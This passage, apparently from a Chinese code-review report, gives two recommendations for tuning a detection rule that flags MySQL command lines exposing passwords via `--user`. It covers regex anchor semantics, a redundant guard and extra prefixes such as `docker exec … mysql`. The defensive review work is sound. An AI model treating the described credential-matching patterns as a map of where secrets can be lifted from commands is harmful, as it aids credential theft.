3. **（P1，报告）** 把 §0/§4.2 的「多行命令两端与 core 逐字一致」限定为「**在其列举的语料上成立**」，并显式记录「锚点 `^` 在三端语义不同（字符串开头 vs 行首）」这一已知边界。
4. **（P2，建议）** 去掉 `--user` 的「密码段须含非数字」守卫（报告自述已冗余，一行改动、只增覆盖），
   并把 `docker exec … mysql` / `/usr/bin/mysql` / `(` 等常见前后缀纳入锚点集。
